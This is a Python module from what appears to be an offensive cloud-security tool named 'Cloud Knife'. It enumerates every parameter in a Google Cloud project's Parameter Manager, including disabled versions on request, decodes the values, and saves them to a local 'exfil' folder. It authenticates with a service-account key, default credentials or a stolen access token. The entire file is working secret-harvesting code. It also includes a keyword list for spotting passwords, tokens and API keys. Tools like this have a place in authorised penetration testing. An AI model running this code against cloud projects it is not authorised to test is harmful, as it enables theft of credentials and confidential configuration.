"""
GCP Parameter Manager Exfiltration for Cloud Knife.

Extracts parameter values from Parameter Manager API.
Automatically decodes base64 encoded values.

Supports authentication via:
- Service Account JSON key file
- Application Default Credentials (ADC)
- Raw access token (via REST API)
"""

import base64
import json
import os
from pathlib import Path
from typing import List, Dict, Any, Optional, TYPE_CHECKING

import requests
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

if TYPE_CHECKING:
    from src.clouds.gcp.gcp_session import GCPSessionManager

console = Console()

# Parameter Manager API base URL
PARAM_API_BASE = "https://parametermanager.googleapis.com/v1"


def exfil_parameters(
    session_mgr: "GCPSessionManager",
    project_id: Optional[str] = None,
    output_dir: Optional[str] = None,
    include_disabled: bool = False,
) -> Dict[str, Any]:
    """
    Extract all parameter values from Parameter Manager.

    Args:
        session_mgr: GCP session manager with valid credentials
        project_id: Project ID to exfiltrate (defaults to current project)
        output_dir: Directory to save extracted values (default: ./exfil/gcp/parameters/)
        include_disabled: Whether to include disabled versions

    Returns:
        Dictionary with exfiltration results
    """
    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured. Use 'set_credentials' first.[/red]")
        return {"success": False, "error": "No credentials"}

    # Determine project
    if not project_id:
        default_project = session_mgr.current_session_data.get("project_id")
        if default_project:
            project_id = Prompt.ask(
                "[cyan]Project ID[/cyan]",
                default=default_project,
            )
        else:
            project_id = Prompt.ask("[cyan]Project ID[/cyan]")

    if not project_id:
        console.print("[red]Project ID is required.[/red]")
        return {"success": False, "error": "Project ID required"}

    # Determine output directory
    if not output_dir:
        exfil_dir = session_mgr.get_exfil_dir("parameters")
        output_dir = str(exfil_dir / project_id)

    Path(output_dir).mkdir(parents=True, exist_ok=True)
    output_dir_abs = str(Path(output_dir).resolve())

    console.print(f"[bold]Exfiltrating parameters from project: {project_id}[/bold]")
    console.print(f"[dim]Output directory: {output_dir_abs}[/dim]")

    # Get auth headers
    auth_method = session_mgr.current_session_data.get("auth_method")

    if auth_method == "access_token":
        token = session_mgr.current_session_data.get("access_token")
    else:
        from google.auth.transport.requests import Request
        credentials.refresh(Request())
        token = credentials.token

    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return {"success": False, "error": "No token"}

    headers = {"Authorization": f"Bearer {token}"}

    # First, list all parameters
    console.print("\n[dim]Listing parameters...[/dim]")
    parameters = _list_all_parameters(headers, project_id)

    if not parameters:
        console.print("[yellow]No parameters found.[/yellow]")
        return {"success": True, "extracted": 0, "failed": 0}

    console.print(f"[dim]Found {len(parameters)} parameters[/dim]")

    # Extract values
    extracted = 0
    failed = 0
    results: List[Dict[str, Any]] = []

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("Extracting...", total=len(parameters))

        for param in parameters:
            param_name = param["name"]
            full_name = param["full_name"]
            location = param.get("location", "unknown")

            # Get versions
            versions = _get_parameter_versions(headers, full_name, include_disabled)

            if not versions:
                progress.advance(task)
                continue

            param_result = {
                "name": param_name,
                "location": location,
                "versions": [],
            }

            for version in versions:
                version_id = version["version_id"]
                version_full_name = version["full_name"]

                # Render (fetch) the value
                value, is_base64 = _render_parameter_version(headers, version_full_name)

                if value is not None:
                    version_result = {
                        "version": version_id,
                        "value": value,
                        "was_base64": is_base64,
                        "disabled": version.get("disabled", False),
                    }
                    param_result["versions"].append(version_result)
                    extracted += 1
                else:
                    failed += 1

            if param_result["versions"]:
                results.append(param_result)

                # Save to file
                _save_parameter_to_file(output_dir, param_name, location, param_result)

            progress.advance(task)

    # Display results
    _display_exfil_results(results)

    # Save summary
    summary = {
        "project": project_id,
        "total_parameters": len(parameters),
        "extracted_versions": extracted,
        "failed": failed,
        "output_dir": output_dir,
        "parameters": results,
    }

    summary_file = os.path.join(output_dir, "_summary.json")
    with open(summary_file, "w") as f:
        json.dump(summary, f, indent=2, default=str)

    console.print(f"\n[bold green]Exfiltration complete![/bold green]")
    console.print(f"  [green]Extracted:[/green] {extracted} version(s)")
    console.print(f"  [red]Failed:[/red] {failed}")
    console.print(f"  [dim]Output:[/dim] {output_dir_abs}")
    console.print(f"  [dim]Summary:[/dim] {Path(summary_file).resolve()}")

    # Save to session
    session_mgr.save_enumeration_data(f"exfil_parameters_{project_id}", summary)

    return summary


def _list_all_parameters(
    headers: Dict[str, str],
    project_id: str,
) -> List[Dict[str, Any]]:
    """List all parameters in a project."""
    parameters: List[Dict[str, Any]] = []
    url = f"{PARAM_API_BASE}/projects/{project_id}/locations/-/parameters"
    page_token = None

    while True:
        params = {"pageSize": 100}
        if page_token:
            params["pageToken"] = page_token

        try:
            response = requests.get(url, headers=headers, params=params, timeout=30)

            if response.status_code != 200:
                break

            data = response.json()
            items = data.get("parameters", [])

            for item in items:
                name_parts = item.get("name", "").split("/")
                param_name = name_parts[-1] if name_parts else "unknown"
                location = name_parts[3] if len(name_parts) > 3 else "unknown"

                parameters.append({
                    "name": param_name,
                    "full_name": item.get("name"),
                    "location": location,
                })

            page_token = data.get("nextPageToken")
            if not page_token:
                break

        except Exception:
            break

    return parameters


def _get_parameter_versions(
    headers: Dict[str, str],
    parameter_full_name: str,
    include_disabled: bool,
) -> List[Dict[str, Any]]:
    """Get versions for a parameter."""
    versions: List[Dict[str, Any]] = []
    url = f"{PARAM_API_BASE}/{parameter_full_name}/versions"

    try:
        response = requests.get(url, headers=headers, timeout=30)

        if response.status_code != 200:
            return []

        data = response.json()
        items = data.get("parameterVersions", [])

        for item in items:
            disabled = item.get("disabled", False)

            # Skip disabled unless requested
            if disabled and not include_disabled:
                continue

            name_parts = item.get("name", "").split("/")
            version_id = name_parts[-1] if name_parts else "unknown"

            versions.append({
                "version_id": version_id,
                "full_name": item.get("name"),
                "disabled": disabled,
            })

    except Exception:
        pass

    return versions


def _render_parameter_version(
    headers: Dict[str, str],
    version_full_name: str,
) -> tuple[Optional[str], bool]:
    """
    Render (fetch) the value of a parameter version.

    Returns:
        Tuple of (value, was_base64_encoded)
    """
    url = f"{PARAM_API_BASE}/{version_full_name}:render"

    try:
        response = requests.get(url, headers=headers, timeout=30)

        if response.status_code != 200:
            return None, False

        data = response.json()

        # Parameter Manager render endpoint returns renderedContent directly
        # or the payload may be in parameterVersion.payload

        # First, check for renderedContent (newer API response format)
        if "renderedContent" in data:
            content = data["renderedContent"]
            # Try to decode base64
            try:
                decoded = base64.b64decode(content).decode("utf-8")
                return decoded, True
            except Exception:
                # Not base64, return as-is
                return content, False

        # Check for payload.data (alternative format)
        if "payload" in data:
            payload = data["payload"]
            if isinstance(payload, dict):
                if "data" in payload:
                    raw_data = payload["data"]
                    try:
                        decoded = base64.b64decode(raw_data).decode("utf-8")
                        return decoded, True
                    except Exception:
                        return raw_data, False
                if "text" in payload:
                    return payload["text"], False
            elif isinstance(payload, str):
                return payload, False

        # Check nested under parameterVersion (legacy format)
        param_version = data.get("parameterVersion", {})
        if isinstance(param_version, dict):
            payload = param_version.get("payload", {})
            if isinstance(payload, dict):
                if "data" in payload:
                    raw_data = payload["data"]
                    try:
                        decoded = base64.b64decode(raw_data).decode("utf-8")
                        return decoded, True
                    except Exception:
                        return raw_data, False
                if "text" in payload:
                    return payload["text"], False

        # Fallback: return the whole response as JSON for debugging
        return json.dumps(data, indent=2), False

    except Exception as e:
        return None, False


def _save_parameter_to_file(
    output_dir: str,
    param_name: str,
    location: str,
    param_result: Dict[str, Any],
) -> None:
    """Save parameter to file."""
    # Create location subdirectory
    location_dir = os.path.join(output_dir, location)
    Path(location_dir).mkdir(parents=True, exist_ok=True)

    # Save each version
    for version in param_result.get("versions", []):
        version_id = version["version"]
        value = version["value"]

        # Determine filename
        if len(param_result["versions"]) == 1:
            filename = f"{param_name}.txt"
        else:
            filename = f"{param_name}_v{version_id}.txt"

        filepath = os.path.join(location_dir, filename)

        with open(filepath, "w") as f:
            f.write(value)


def _display_exfil_results(results: List[Dict[str, Any]]) -> None:
    """Display extracted parameters."""
    if not results:
        return

    console.print("\n[bold]Extracted Parameters:[/bold]\n")

    table = Table(show_header=True)
    table.add_column("Parameter", style="green", overflow="fold", no_wrap=False)
    table.add_column("Location", style="dim")
    table.add_column("Versions", style="cyan", justify="right")
    table.add_column("Value Preview", overflow="fold", no_wrap=False)

    for param in results[:20]:  # Limit display
        name = param["name"]
        location = param.get("location", "-")
        versions = param.get("versions", [])
        version_count = len(versions)

        # Get latest version value preview
        if versions:
            latest_value = versions[0]["value"]
            # Truncate for display
            if len(latest_value) > 60:
                preview = latest_value[:57] + "..."
            else:
                preview = latest_value

            # Mask potential secrets
            if _looks_like_secret(name, latest_value):
                preview = f"[yellow]{preview[:20]}...[MASKED][/yellow]"
        else:
            preview = "-"

        table.add_row(name, location, str(version_count), preview)

    console.print(table)

    if len(results) > 20:
        console.print(f"\n[dim]... and {len(results) - 20} more parameters[/dim]")


def _looks_like_secret(name: str, value: str) -> bool:
    """Check if a parameter looks like it contains a secret."""
    secret_indicators = [
        "password", "secret", "key", "token", "credential",
        "api_key", "apikey", "private", "auth",
    ]

    name_lower = name.lower()
    for indicator in secret_indicators:
        if indicator in name_lower:
            return True

    # Check value patterns (starts with common secret prefixes)
    if value.startswith(("sk-", "pk-", "api-", "token-", "Bearer ")):
        return True

    return False


def exfil_single_parameter(
    session_mgr: "GCPSessionManager",
    parameter_name: str,
    project_id: Optional[str] = None,
    location: str = "global",
    version: str = "latest",
) -> Optional[str]:
    """
    Extract a single parameter value.

    Args:
        session_mgr: GCP session manager with valid credentials
        parameter_name: Name of the parameter
        project_id: Project ID (defaults to current project)
        location: Location (default: global)
        version: Version to fetch (default: latest)

    Returns:
        Parameter value or None on failure
    """
    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured.[/red]")
        return None

    if not project_id:
        project_id = session_mgr.current_session_data.get("project_id")

    if not project_id:
        console.print("[red]Project ID is required.[/red]")
        return None

    # Get auth headers
    auth_method = session_mgr.current_session_data.get("auth_method")

    if auth_method == "access_token":
        token = session_mgr.current_session_data.get("access_token")
    else:
        from google.auth.transport.requests import Request
        credentials.refresh(Request())
        token = credentials.token

    if not token:
        console.print("[red]Failed to get access token.[/red]")
        return None

    headers = {"Authorization": f"Bearer {token}"}

    # Build version name
    if version == "latest":
        # Need to list versions to get latest
        param_full_name = f"projects/{project_id}/locations/{location}/parameters/{parameter_name}"
        versions = _get_parameter_versions(headers, param_full_name, include_disabled=False)

        if not versions:
            console.print(f"[red]No versions found for parameter '{parameter_name}'[/red]")
            return None

        version_full_name = versions[0]["full_name"]
    else:
        version_full_name = f"projects/{project_id}/locations/{location}/parameters/{parameter_name}/versions/{version}"

    # Render the value
    value, was_base64 = _render_parameter_version(headers, version_full_name)

    if value is not None:
        console.print(f"[green]Parameter:[/green] {parameter_name}")
        console.print(f"[dim]Location:[/dim] {location}")
        console.print(f"[dim]Base64 decoded:[/dim] {'Yes' if was_base64 else 'No'}")
        console.print(f"\n[bold]Value:[/bold]")
        console.print(value)
        return value
    else:
        console.print(f"[red]Failed to fetch parameter '{parameter_name}'[/red]")
        return None
